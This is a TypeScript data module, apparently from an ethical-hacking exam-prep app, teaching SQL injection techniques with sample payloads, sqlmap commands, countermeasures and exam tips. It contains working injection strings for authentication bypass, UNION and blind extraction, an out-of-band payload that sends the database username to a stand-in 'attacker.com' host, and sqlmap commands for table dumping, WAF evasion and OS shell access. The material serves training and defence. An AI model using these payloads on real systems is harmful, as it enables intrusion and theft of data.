import type { Module } from '../cehModules';

export const m15: Module = {
  id: 'm15',
  number: 'M15',
  title: 'SQL Injection',
  description: 'Master the mechanics of SQL Injection (SQLi), the most devastating data-layer attack. Learn to exploit poorly sanitized input fields to bypass authentication, extract complete database schemas, manipulate underlying data, bypass Web Application Firewalls (WAFs), and escalate to full OS command execution. Analyze Error-based, Union-based, Blind, and Out-of-Band SQLi methodologies across MSSQL, MySQL, and Oracle.',
  examWeight: '6%',
  estimatedQuestions: 7,
  duration: '4h 00m',
  topics: [
    {
      id: 'm15-t01',
      title: 'Mechanics of SQL Injection',
      content: 'SQL Injection occurs when user-supplied data is concatenated directly into a backend database query without sanitization or parameterization. This allows the attacker\'s input to alter the syntactic structure of the SQL query, forcing the database interpreter to execute unintended commands.',
      commands: [
        { command: 'admin\' OR \'1\'=\'1', description: 'Classic Authentication Bypass payload: forces the WHERE clause to evaluate to TRUE' },
        { command: 'admin\' -- -', description: 'Authentication Bypass: logs in as admin and comments out the password check (MySQL)' },
        { command: 'admin\'; WAITFOR DELAY \'0:0:10\'--', description: 'Stacked Queries: terminating the first query and injecting a second query (MSSQL)' },
      ],
      keyPoints: [
        'The Flaw: `SELECT * FROM users WHERE username = \'$user_input\'`. If `$user_input` is `admin\' OR \'1\'=\'1`, the query evaluates to `SELECT * FROM users WHERE username = \'admin\' OR \'1\'=\'1\'`. Since 1=1 is always true, the login succeeds regardless of the password.',
        'Comments: Attackers use comment characters to drop the rest of the legitimate query, preventing syntax errors. Syntax varies: `--` (MSSQL), `-- -` or `#` (MySQL), `/* ... */` (inline/C-style).',
        'String Concatenation: Used to bypass basic WAF filters. `+` (SQL Server), `||` (Oracle), `CONCAT()` (MySQL). Example: `SELECT \'ad\'+\'min\'`.',
        'Stacked Queries: Using a semicolon (`;`) to execute multiple distinct SQL statements in a single transaction. Highly dangerous but often disabled by default in PHP/MySQL (PDO).',
      ],
    },
    {
      id: 'm15-t02',
      title: 'In-Band SQL Injection (Error & UNION)',
      content: 'In-Band SQLi is the most common and easiest to exploit. The attacker uses the same communication channel (the HTTP response) to launch the attack and gather the results. The stolen data is directly returned to the attacker\'s browser.',
      commands: [
        { command: '\' ORDER BY 5--', description: 'Reconnaissance: Increment the number until a syntax error occurs to determine the exact number of columns returned by the original query' },
        { command: '\' UNION SELECT 1,@@version,3,4,5--', description: 'UNION Attack: Extracts the database version into the second column of the web page output' },
        { command: '\' AND extractvalue(rand(),concat(0x3a,(SELECT version())))--', description: 'Error-Based (MySQL): Forces an XPath error that prints the result of the injected query inside the error message' },
      ],
      keyPoints: [
        'Error-Based SQLi: The attacker intentionally injects malformed syntax or forces type conversion errors to trigger a verbose database error. Modern attacks use functions like `extractvalue()` or `updatexml()` to force the database to print the query results inside the error message itself.',
        'UNION-Based SQLi: Uses the `UNION` operator to combine the results of the original query with the results of a completely new injected query. CRITICAL RULE: Both queries must return the EXACT same number of columns with matching data types.',
        'Information Schema: The default metadata database in MySQL/MSSQL used to enumerate structure. Attackers query `information_schema.tables` and `information_schema.columns` to map the database before extracting data.',
      ],
    },
    {
      id: 'm15-t03',
      title: 'Blind & Out-of-Band (OOB) SQL Injection',
      content: 'Blind SQLi occurs when the application is vulnerable, but its HTTP responses do NOT contain the results of the query or any database errors. The attacker must ask the database True/False questions and infer the answers based on the application\'s behavior, extracting data one bit at a time.',
      commands: [
        { command: '\' AND (SELECT substring(password,1,1) FROM users WHERE username=\'admin\')=\'a\'--', description: 'Boolean-Blind: Asks if the first letter of the password is "a". The attacker observes if the page loads normally (True) or is missing content (False)' },
        { command: '\' AND IF(substring(version(),1,1)=\'5\',SLEEP(10),0)--', description: 'Time-Blind (MySQL): If the version starts with 5, the database pauses for 10 seconds before responding' },
        { command: 'DECLARE @q varchar(1024); SET @q = \'\\\\\'+(SELECT user)+\'.attacker.com\\test\'; EXEC master..xp_dirtree @q--', description: 'OOB (MSSQL): Forces the database server to perform a DNS lookup containing the stolen username data' },
      ],
      keyPoints: [
        'Boolean-Based (Content-Based) Blind: The attacker injects a True statement (`AND 1=1`) and notes the page content. Then injects a False statement (`AND 1=2`) and notes the difference. By automating True/False questions via scripts, they extract data letter by letter (binary search).',
        'Time-Based Blind: The application response does not change regardless of True/False queries. The attacker injects time-delay functions (`WAITFOR DELAY \'0:0:10\'` in MSSQL or `SLEEP(10)` in MySQL). If the server pauses, the condition was True.',
        'Out-of-Band (OOB) SQLi: The attacker forces the backend database server to make an external network request (DNS or HTTP) to an attacker-controlled server (like Burp Collaborator). The stolen data is exfiltrated inside the DNS query itself.',
      ],
    },
    {
      id: 'm15-t04',
      title: 'Advanced Exploitation & sqlmap',
      content: 'While manual SQLi is critical for understanding the vulnerability, professional exploitation involves automated tools that can map entire databases, crack password hashes, bypass WAFs, and establish OS-level access.',
      commands: [
        { command: 'sqlmap -r request.txt --dbs --batch', description: 'Automated SQLi: Use an intercepted HTTP request file from Burp Suite and automatically extract all databases' },
        { command: 'sqlmap -u "http://target.com/page.php?id=1" -D app_db -T users --dump', description: 'Extract (dump) the entire contents of the "users" table within the "app_db" database' },
        { command: 'sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,charencode', description: 'WAF Bypass: Use tamper scripts to obfuscate the payload (e.g., replacing spaces with `/**/`)' },
        { command: 'sqlmap -u "http://target.com/page.php?id=1" --os-shell', description: 'Gain an interactive OS-level command shell by exploiting the database privileges' },
      ],
      keyPoints: [
        'sqlmap: The undisputed industry-standard automated SQL injection tool. It handles Error, UNION, Boolean-Blind, and Time-Blind attacks seamlessly.',
        'OS Exploitation (MSSQL): If the database user is `sa`, the attacker can enable the `xp_cmdshell` stored procedure to execute Windows command prompt commands directly from SQL.',
        'OS Exploitation (MySQL): If the user has the `FILE` privilege, attackers can use `INTO OUTFILE` to write a PHP web shell directly to the web server\'s document root.',
        'WAF Evasion: Attackers use URL encoding, hex encoding, capitalization variations (`SeLeCt`), or inline comments (`SELECT/**/user/**/FROM/**/users`) to bypass signature-based firewalls.',
      ],
    },
  ],
  keyTools: ['sqlmap', 'Burp Suite Professional (Intruder/Collaborator)', 'OWASP ZAP', 'Havij (Legacy)'],
  countermeasures: [
    'Parameterized Queries (Prepared Statements): The absolute definitive defense. The database driver treats the user input strictly as literal data, never as executable code, completely neutralizing all forms of SQLi.',
    'Object-Relational Mapping (ORM): Using frameworks like Entity Framework, Hibernate, or Sequelize, which handle parameterization automatically.',
    'Input Validation (Allowlisting): Enforce strict data types (e.g., an ID parameter must be cast to an Integer before processing) and reject anything else.',
    'Principle of Least Privilege: The database account used by the web application should only have `SELECT/INSERT/UPDATE` access to necessary tables. It should NEVER run as `sa`, `dba`, or `root`, and should not have file system read/write privileges.',
    'Disable Verbose Errors: Ensure generic HTTP 500 error pages are displayed in production to prevent Error-Based SQLi reconnaissance.',
    'Web Application Firewall (WAF): Deploy a WAF to detect and block common SQLi signatures (e.g., `UNION SELECT`, `WAITFOR DELAY`), though it should not replace Prepared Statements.',
  ],
  examTips: [
    'The classic authentication bypass payload is `\' OR 1=1 --`. Know what it does: it makes the WHERE clause always evaluate to True.',
    'UNION SQLi requires both queries to have the EXACT SAME number of columns. Use `ORDER BY` to find that number first.',
    'Boolean-Blind looks for differences in the web page content (True vs False). Time-Blind looks for differences in the RESPONSE TIME (`SLEEP`).',
    'Out-of-Band (OOB) SQLi uses DNS or HTTP requests to exfiltrate data when the application response is completely blind.',
    'sqlmap is the primary automated tool. Know the basic flags: `--dbs` (databases), `--tables` (tables), `--dump` (extract data), `--os-shell` (OS execution), and `--tamper` (WAF bypass).',
    'Prepared Statements (Parameterized Queries) are the definitive mitigation against SQL Injection. This is a guaranteed exam question.',
  ],
  realWorldScenarios: [
    'You are testing a login form. You input `admin\'#` into the username field and leave the password blank. The application logs you in. The `#` character commented out the password check in the MySQL query, allowing you to bypass authentication entirely without knowing the password.',
    'An e-commerce site\'s product page (`product.php?id=5`) appears secure, but when you append an apostrophe (`id=5\'`), it returns a verbose ODBC error. You use `ORDER BY 1, ORDER BY 2...` until `ORDER BY 6` throws an error. You now know the original query returns 5 columns, and you proceed to construct a `UNION SELECT 1,2,3,4,5` payload to map the database.',
    'A login page returns the exact same "Invalid Credentials" message regardless of the input, and no errors are shown. You inject `username=admin\' AND SLEEP(10)--`. The page takes exactly 10 seconds to respond. You have confirmed a Time-Based Blind SQLi vulnerability and use sqlmap to automatically extract data using timing delays.',
    'During an engagement, you discover a blind SQLi but the WAF blocks `sqlmap`. You use `--tamper=space2comment,randomcase` to encode the payload. Sqlmap bypasses the WAF and you discover the database is running as `sa` (System Administrator). You use the `--os-shell` flag to execute Windows commands and compromise the domain.',
  ],
  prerequisites: ['M14 — Understanding web application parameters (GET/POST/Cookies) is required to identify injection points.'],
};
